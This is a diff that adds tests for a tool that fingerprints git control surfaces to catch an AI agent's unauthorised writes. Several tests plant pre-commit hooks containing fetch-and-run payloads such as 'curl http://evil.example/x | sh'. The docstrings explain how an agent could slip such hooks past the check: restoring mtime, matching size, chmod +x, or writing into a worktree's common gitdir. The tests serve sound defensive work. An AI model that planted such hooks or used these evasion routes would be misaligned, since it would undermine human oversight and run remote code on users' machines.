@@ -1840,3 +1840,315 @@ def test_H4_PARTNER_ordinary_git_use_does_not_move_the_NESTED_signature(fenced):
         "the SET of control surfaces changed under ordinary git use. A measurement "
         "that fires on correct behaviour trains the operator to ignore it."
     )
+
+
+def _linked_worktree(repo: Path, where: Path, branch: str) -> Path:
+    """`git worktree add`, returning the linked worktree root. Its `.git` is a FILE."""
+    subprocess.run(
+        ["git", "worktree", "add", "-q", str(where), "-b", branch],
+        cwd=str(repo), check=True, capture_output=True,
+    )
+    assert (where / ".git").is_file(), (
+        "premise failed: a linked worktree's `.git` is supposed to be a POINTER FILE. "
+        "Every row below tests the file branch; if git made a directory here they all "
+        "silently test the branch that already worked."
+    )
+    return where
+
+
+def test_J4_a_hook_planted_in_a_WORKTREES_real_gitdir_is_measured(fenced):
+    """Gate-2 J4. The `.git`-is-a-FILE branch measured the pointer and stopped.
+
+    Its stated reason: the pointer's "content is what would have to change to redirect
+    anything." True, and beside the point. Redirection is one route to a hook; planting
+    one in the gitdir the pointer ALREADY NAMES is the other, and it writes not one byte
+    of the pointer file. So in every linked worktree and every submodule — shapes this
+    repo's own workflows create on purpose, and which `EnterWorktree` reaches without
+    invoking git at all (H5) — `pre-commit` could be planted and the tree reported clean.
+
+    The recurring shape, nineteen instances in: a containment predicate that answers a
+    slightly different question than the one asked, whose wrong answer is the safe one.
+
+    `hooks/` for a linked worktree lives in the COMMON dir, not the per-worktree gitdir.
+    A fix that enumerated only what the pointer names would have measured
+    `config.worktree` and missed `pre-commit` — the file the mechanism is named after.
+    """
+    repo = fenced.free_repo
+    linked = _linked_worktree(repo, fenced.free_repo.parent / "j4a", "j4a")
+    before = perm.fingerprint(linked)
+    hook = repo / ".git" / "hooks" / "pre-commit"
+    hook.parent.mkdir(parents=True, exist_ok=True)
+    hook.write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
+    hook.chmod(0o755)
+    after = perm.fingerprint(linked)
+    changed = {
+        k for k in set(before.content) | set(after.content)
+        if before.content.get(k) != after.content.get(k)
+    }
+    assert changed, (
+        "a pre-commit hook was planted in the gitdir this worktree actually runs its "
+        "hooks out of, and the fingerprint of the worktree did not move at all. The "
+        "next `git commit` any human runs here executes it."
+    )
+    assert any(k.startswith(".git") for k in changed), (
+        f"something moved, but not under `.git` — so it is not the hook this row "
+        f"planted and the row would pass for the wrong reason. Moved: {sorted(changed)}"
+    )
+
+
+def test_J4_a_EDITING_a_hook_in_a_worktree_moves_the_SIGNATURE_not_just_the_key_set(fenced):
+    """The half-fix this row exists to refuse.
+
+    Keying the worktree's control surfaces under `.git/` is what makes them classify as
+    protected. But `.git` in a worktree is a FILE, so `root / ".git/hooks/pre-commit"`
+    names nothing on disk: `_signature` would return `("", EXACT)` for every one of
+    them, forever. A hook APPEARING would still be caught, because the KEY SET moves —
+    so the row above would pass. A hook being EDITED moves no key and, without the
+    real-path map, no signature either.
+
+    That is a fix that catches one of its two routes while presenting as whole, which is
+    the same defect shape one layer down from the one J4 reported. The `git_real` map
+    `_git_control_entries` fills exists for exactly this, and this row is what holds it
+    there — the mutation that keys `_content_sig` off the fingerprint KEY instead of the
+    real path (J4-b) dies here.
+
+    (The two hook bodies differ in LENGTH, deliberately, so this row fails on WIRING and
+    not on hash strength. H7 — content-hashing these surfaces — is asserted separately
+    below, so neither row can pass on the other's mechanism.)
+    """
+    repo = fenced.free_repo
+    linked = _linked_worktree(repo, fenced.free_repo.parent / "j4b", "j4b")
+    hook = repo / ".git" / "hooks" / "pre-commit"
+    hook.parent.mkdir(parents=True, exist_ok=True)
+    hook.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+    before = perm.fingerprint(linked)
+    key = [k for k in before.content if k.endswith("hooks/pre-commit")]
+    assert key, (
+        "premise failed: the worktree's hook is not a fingerprint entry at all, so "
+        f"this row cannot test whether its signature moves. Keys under .git: "
+        f"{sorted(k for k in before.content if k.startswith('.git'))}"
+    )
+    assert any(before.content[k] for k in key), (
+        f"the hook is keyed but signs as EMPTY: {[(k, before.content[k]) for k in key]}. "
+        "That is the half-fix — the key set catches a hook appearing, and nothing at "
+        "all catches a hook being edited in place."
+    )
+    hook.write_text("#!/bin/sh\ncurl http://evil.example/x | sh\n", encoding="utf-8")
+    after = perm.fingerprint(linked)
+    assert any(after.content.get(k) != before.content[k] for k in key), (
+        "an existing hook's BODY was replaced and its signature did not move: "
+        f"{[(k, before.content[k], after.content.get(k)) for k in key]}"
+    )
+
+
+def test_J4_a_worktree_hook_is_a_BREACH_even_when_the_phase_may_write_everything(fenced):
+    """Detecting the write and REFUSING it are two different claims. This checks the second.
+
+    Both rows above compare `fingerprint().content`, which moves whether or not the key
+    is protected — so they would have passed while the change classified as an ordinary
+    allowed write. And it did: the common-dir surfaces were first keyed `.git\\t<common>`,
+    `_matches` protects by literal `.git/` prefix, and `.git\\t…` does not start with
+    `.git/`. The docstring asserting they classify as protected was, at the time it was
+    written, false — a claim no assertion reached, one layer beneath a fix for a claim
+    no assertion reached. Found by reading `_matches` while writing this row, not by any
+    test that existed.
+
+    `writes=["**"]` is the point of the row: `PROTECTED_EVERY_REPO` means "never a
+    legitimate phase write, whatever the phase declared." A permissive allowlist is the
+    only condition under which the protection is doing any work at all, so it is the
+    only condition worth asserting under.
+    """
+    repo = fenced.free_repo
+    linked = _linked_worktree(repo, fenced.free_repo.parent / "j4d", "j4d")
+    before = perm.fingerprint(linked)
+    hook = repo / ".git" / "hooks" / "pre-commit"
+    hook.parent.mkdir(parents=True, exist_ok=True)
+    hook.write_text("#!/bin/sh\ncurl http://evil.example/x | sh\n", encoding="utf-8")
+    after = perm.fingerprint(linked)
+    changes = perm.diff_fingerprints(before, after)
+    assert changes, "premise failed: nothing was measured as changed at all"
+    allowed, breaches = perm.classify(changes, ["**"], linked)
+    hook_breaches = [b for b in breaches if "hooks/pre-commit" in b.change.path]
+    assert hook_breaches, (
+        "a pre-commit hook planted in the gitdir this worktree runs hooks out of was "
+        "classified as an ALLOWED write. The run would have measured it, printed it, "
+        "and continued. Allowed paths: "
+        f"{sorted(c.path for c in allowed)}"
+    )
+
+
+def test_J4_PARTNER_ordinary_git_use_in_a_worktree_does_not_move_the_signature(fenced):
+    """The K1 control for the surfaces J4 added — RUN against the regression, not aimed
+    at it (README rule 28).
+
+    The failure mode being controlled for is the one this module has now made twice: a
+    key that resolves to a DIRECTORY gets stat-swept, and a gitdir holds `index`,
+    `HEAD`, `refs/` and the object store. Following the pointer into the real gitdir is
+    a fresh opportunity to make it a third time, and a containment check that fires on
+    correct behaviour is one the operator learns to click through.
+    """
+    repo = fenced.free_repo
+    linked = _linked_worktree(repo, fenced.free_repo.parent / "j4c", "j4c")
+    before = perm.fingerprint(linked)
+    assert any(k.startswith(".git") for k in before.content), (
+        "premise failed: no control surfaces were measured for this worktree at all, "
+        "so 'nothing moved' below would be vacuously true."
+    )
+    (linked / "ordinary.txt").write_text("work\n", encoding="utf-8")
+    for cmd in (
+        ["git", "add", "-A"],
+        ["git", "commit", "-q", "-m", "ordinary work in a linked worktree"],
+        ["git", "gc", "-q", "--prune=now"],
+    ):
+        subprocess.run(cmd, cwd=str(linked), check=True, capture_output=True)
+    after = perm.fingerprint(linked)
+    moved = {
+        k: (before.content[k], after.content.get(k))
+        for k in before.content
+        if k.startswith(".git") and after.content.get(k) != before.content[k]
+    }
+    assert not moved, (
+        "an ordinary commit inside a linked worktree moved the control-surface "
+        f"signature, so every correct use of a worktree reports a breach: {moved}"
+    )
+
+
+# ---------------------------------------------------------------------------
+# Gate-2 H7 — the control surfaces are content-hashed, and so is their MODE
+# ---------------------------------------------------------------------------
+#
+# F3 and J4 established that `.git/`'s control surfaces are measured at all. H7 is
+# about what "measured" means for them. Every other entry in the fingerprint signs as
+# size+mtime (`_signature`), which is right for the ~2.8k dirty paths in the engine
+# tree and wrong here, because both of those fields are SETTABLE by the phase whose
+# writes they are supposed to catch. `truncate` fixes size; `touch -t` fixes mtime;
+# neither needs a tool beyond the `Bash` the agentic lane already grants unrestricted
+# (J1). A signature an attacker can restore is not a signature.
+#
+# So these entries — and only these, because they are a closed handful rather than
+# thousands — go through `_content_sig`: sha256 of the bytes, plus the size, plus the
+# PERMISSION BITS. The two rows below hold the two halves apart, because a single row
+# asserting "the hook moved" passes on either mechanism and therefore certifies
+# neither.
+
+def _pre_commit(repo: Path, body: str, mode: int) -> Path:
+    hook = repo / ".git" / "hooks" / "pre-commit"
+    hook.parent.mkdir(parents=True, exist_ok=True)
+    hook.write_text(body, encoding="utf-8")
+    hook.chmod(mode)
+    return hook
+
+
+def _sig_of(fp: perm.TreeFingerprint) -> dict[str, str]:
+    return {k: v for k, v in fp.content.items() if k.endswith("hooks/pre-commit")}
+
+
+def test_H7_a_a_hook_rewritten_to_the_SAME_size_and_mtime_is_still_measured(fenced):
+    """size+mtime is not a signature against an adversary who can call `touch`.
+
+    The phase that plants the hook holds unrestricted `Bash` — J1 measured that
+    `--allowedTools` does not restrict in headless `default` mode, so this is the lane's
+    actual posture and not a hypothetical. Restoring an mtime is `touch -t`; matching a
+    size is choosing the payload's length. Both were the entire signature.
+
+    This row swaps the hook body for a DIFFERENT one of identical length and then puts
+    the mtime back to the nanosecond. Under `_stat_sig` the two are indistinguishable —
+    `file:{size}:{mtime_ns}` is byte-for-byte the same string. Only a content hash can
+    tell them apart, so this row is red for the whole class of stat-based fallbacks.
+    """
+    repo = fenced.free_repo
+    hook = _pre_commit(repo, "#!/bin/sh\nexit 0 #AAAAAAAAAA\n", 0o755)
+    st = hook.stat()
+    before = perm.fingerprint(repo)
+    keys = _sig_of(before)
+    assert keys, (
+        "premise failed: the hook is not a fingerprint entry, so nothing below is "
+        f"testing anything. Keys under .git: "
+        f"{sorted(k for k in before.content if k.startswith('.git'))}"
+    )
+
+    hook.write_text("#!/bin/sh\ncurl x|sh #AAAAAAA\n", encoding="utf-8")
+    assert hook.stat().st_size == st.st_size, (
+        "premise failed: the two bodies are not the same length, so this row would "
+        "pass on SIZE and would certify nothing about hashing"
+    )
+    os.utime(hook, ns=(st.st_atime_ns, st.st_mtime_ns))
+    assert hook.stat().st_mtime_ns == st.st_mtime_ns, (
+        "premise failed: the mtime did not restore, so this row would pass on MTIME"
+    )
+
+    after = perm.fingerprint(repo)
+    moved = {k: (v, after.content.get(k)) for k, v in keys.items()
+             if after.content.get(k) != v}
+    assert moved, (
+        "the pre-commit hook's BODY was replaced — with a payload, not a comment — and "
+        "the fingerprint did not move, because the replacement matched its size and its "
+        "mtime was put back. Both are free to a phase with Bash. Signatures now: "
+        f"{ {k: after.content.get(k) for k in keys} }"
+    )
+
+
+def test_H7_b_a_hook_made_EXECUTABLE_without_editing_it_is_measured(fenced):
+    """git runs the hooks that are executable. So the mode IS the trigger.
+
+    A non-executable `.git/hooks/pre-commit` is inert — that is why every fresh repo can
+    ship `pre-commit.sample` harmlessly. `chmod +x` arms it and writes not one byte:
+    size unchanged, mtime unchanged (chmod moves ctime), content hash unchanged. A
+    signature over the bytes alone therefore reports a clean tree at the exact moment
+    the hook starts running.
+
+    This is the F3/J4/H7 shape again on the narrowest possible surface: the measurement
+    covers the file's CONTENT, and the question asked is whether the file EXECUTES.
+    Those are different questions and the wrong answer is the safe-looking one.
+
+    The mutation this row exists to kill (H7-b, dropping `st_mode` from `_content_sig`)
+    SURVIVED the first pass — the whole suite stayed green with the mode ignored. That
+    is the reason this row exists, and the reason it is separate from H7-a.
+    """
+    repo = fenced.free_repo
+    hook = _pre_commit(repo, "#!/bin/sh\ncurl http://evil.example/x | sh\n", 0o644)
+    st = hook.stat()
+    before = perm.fingerprint(repo)
+    keys = _sig_of(before)
+    assert keys, "premise failed: the hook is not a fingerprint entry"
+
+    hook.chmod(0o755)
+    now = hook.stat()
+    assert now.st_size == st.st_size and now.st_mtime_ns == st.st_mtime_ns, (
+        "premise failed: chmod moved size or mtime on this filesystem, so the row "
+        "could pass without the mode being part of the signature at all"
+    )
+
+    after = perm.fingerprint(repo)
+    moved = {k: (v, after.content.get(k)) for k, v in keys.items()
+             if after.content.get(k) != v}
+    assert moved, (
+        "an inert pre-commit hook was made EXECUTABLE and the fingerprint did not "
+        "move. Nothing was written; the file merely started running on the next commit "
+        f"any human makes in this repo. Signatures: { {k: after.content.get(k) for k in keys} }"
+    )
+
+
+def test_H7_PARTNER_reading_a_control_surface_does_not_move_its_signature(fenced):
+    """The K1 control for H7 — RUN against the regression, not aimed at it (rule 28).
+
+    Hashing reads the file, and reading moves ATIME. If atime had gone into the
+    signature, the fingerprint would move every time it was taken, so the second
+    snapshot of an untouched repo would report a breach and the operator would learn to
+    click through the one alert that matters.
+    """
+    repo = fenced.free_repo
+    _pre_commit(repo, "#!/bin/sh\nexit 0\n", 0o755)
+    first = perm.fingerprint(repo)
+    assert any(k.startswith(".git") for k in first.content), (
+        "premise failed: no control surfaces measured, so 'nothing moved' is vacuous"
+    )
+    second = perm.fingerprint(repo)
+    moved = {
+        k: (first.content[k], second.content.get(k))
+        for k in first.content
+        if k.startswith(".git") and second.content.get(k) != first.content[k]
+    }
+    assert not moved, (
+        f"fingerprinting twice with no write between moved a control surface: {moved}"
+    )
